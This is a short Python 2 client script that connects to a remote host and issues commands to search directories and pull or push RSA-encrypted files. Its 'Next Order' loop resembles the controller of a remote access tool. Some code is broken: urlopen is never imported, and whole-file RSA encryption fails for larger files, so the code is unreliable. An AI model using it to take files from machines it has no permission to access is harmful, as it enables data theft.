
'''

DIRSEARCH <directory> <filename>
    DIRSEARCH looks for the file in the given directory or its
    subdirectories. If it finds the file, it sends back the location.
DOWNLOAD <filename>
    DOWNLOAD requires the full file path, or at least the relative path,
    of the file. It sends the contents of the file across the network.
UPLOAD <filename>
    UPLOAD requires the full file path, or at least the relative path,
    where the user wants to locate the file. It reads the file contents
    from across the network connection.
CLOSE
    CLOSE ends the connection
'''


import os, re, socket, threading, struct, sys, certificate
from ctypes import *
from M2Crypto import RSA, X509

def read_file(filename):

	f = open(filename,'r')

	data = f.read()
	f.close()
	return data

def create_file(filename, data):
	f = open(filename,'w')

	f.write(data)
	f.close()
	return

def recv_data(sock):

	data_len = struct.unpack('!I',sock.recv(4))
	data = sock.recv(data_len[0])

	return data

def send_data(sock,data):

	data_len = struct.pack('!I',len(data))
	sock.send(data_len)
	sock.send(data)

	return

def send_file_contents(file_name,usersock,rsa_key): #DOWNLOAD

	data = read_file(file_name)
	cipher = rsa_key.public_encrypt(data, RSA.pkcs1_padding)
	send_data(usersock,cipher)

	return

def receive_file_contents(file_name,usersock,ReadRSA):#UPLOAD

	data = recv_data(usersock)

	try:
		plaintext = ReadRSA.private_decrypt (data, RSA.pkcs1_padding)
	except:
		print "Error: wrong key?"
		plaintext = ""

	create_file(file_name,plaintext)

	return

def getMyIP():

    data = str(urlopen('http://checkip.dyndns.com/').read())

    return re.compile('\d+\.\d+\.\d+\.\d+').search(data).group(0)



def main():

	continua = True

	certificate.create_self_signed_cert()


	f = open("selfsigned.crt")
	cert_buffer = f.read()
	f.close()

	cert = X509.load_cert_string(cert_buffer, X509.FORMAT_PEM)
	pub_key = cert.get_pubkey()
	rsa_key = pub_key.get_rsa()

	ReadRSA = RSA.load_key('private.key')

	sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sock.connect((sys.argv[1],10009))

	while(continua == True):

		order = raw_input("Next Order:")
		orders = order.split(" ")
		send_data(sock,orders[0])

		if(orders[0] == "DIRSEARCH"):
			send_data(sock,orders[1])
			print recv_data(sock)

		if(orders[0] == "DOWNLOAD"):
			send_data(sock,orders[1])
			receive_file_contents(orders[1],sock,ReadRSA)

		if(orders[0] == "UPLOAD"):
			send_data(sock,orders[1])
			send_file_contents(orders[1],sock,rsa_key)

		if(orders[0] == "CLOSE"):
			continua = False

	return
main()



